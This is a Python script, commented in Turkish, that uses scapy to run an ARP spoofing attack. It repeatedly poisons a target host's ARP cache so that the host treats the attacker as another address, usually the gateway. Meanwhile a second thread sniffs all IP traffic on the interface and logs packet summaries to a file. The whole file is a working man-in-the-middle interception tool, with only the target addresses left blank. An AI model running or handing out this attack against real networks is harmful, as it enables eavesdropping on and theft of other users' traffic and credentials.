from scapy.all import ARP, Ether, send, srp, sniff
import time
import threading
import logging

logging.basicConfig(filename='arp_and_sniff.log', level=logging.INFO, format='%(asctime)s - %(message)s')

def get_mac(ip, interface='eth0'):
    """Verilen IP adresi için MAC adresini alır."""
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, iface=interface, verbose=False)
    for _, rcv in ans:
        return rcv[Ether].src
    return None

def arp_spoof(target_ip, spoof_ip, interface='eth0'):
    """Hedef IP adresini kötü niyetli IP adresi ile spoof eder."""
    target_mac = get_mac(target_ip, interface)
    if not target_mac:
        print(f"MAC adresi bulunamadı: {target_ip}")
        return
    
    arp_response = ARP(op=2, psrc=spoof_ip, pdst=target_ip, hwdst=target_mac)
    send(arp_response, iface=interface, verbose=False)
    logging.info(f"Spoofed {target_ip} with {spoof_ip}")

def restore_arp(target_ip, original_ip, interface='eth0'):
    """Hedef IP adresini eski IP adresi ile geri yükler."""
    target_mac = get_mac(target_ip, interface)
    original_mac = get_mac(original_ip, interface)
    if not target_mac or not original_mac:
        print(f"MAC adresleri bulunamadı: {target_ip} veya {original_ip}")
        return
    
    arp_response = ARP(op=2, psrc=original_ip, pdst=target_ip, hwdst=target_mac, hwsrc=original_mac)
    send(arp_response, iface=interface, count=4, verbose=False)
    logging.info(f"ARP tablosu {target_ip} için geri yüklendi.")

def packet_sniffer(interface='eth0'):
    """Ağ trafiğini yakalar ve kaydeder."""
    def packet_callback(packet):
        logging.info(f"Paket yakalandı: {packet.summary()}")

    sniff(iface=interface, filter="ip", prn=packet_callback, store=0)

def arp_spoofing_loop(target_ip, spoof_ip, interface='eth0'):
    """ARP spoofing döngüsünü başlatır."""
    while True:
        arp_spoof(target_ip, spoof_ip, interface)
        time.sleep(2)  # Her 2 saniyede bir spoof yap

if __name__ == '__main__':
    target_ip = None # Hedef IP adresi
    spoof_ip = None   # Kötü niyetli IP adresi (genellikle ağ geçidi)
    interface = 'eth0'         # Kullanılan ağ arayüzü

    try:
        # ARP spoofing ve paket yakalama için thread oluştur
        spoof_thread = threading.Thread(target=arp_spoofing_loop, args=(target_ip, spoof_ip, interface))
        sniff_thread = threading.Thread(target=packet_sniffer, args=(interface,))
        
        spoof_thread.start()
        sniff_thread.start()
        
        spoof_thread.join()
        sniff_thread.join()

    except KeyboardInterrupt:
        print("\nARP spoofing ve paket yakalama durduruluyor...")
        restore_arp(target_ip, spoof_ip, interface)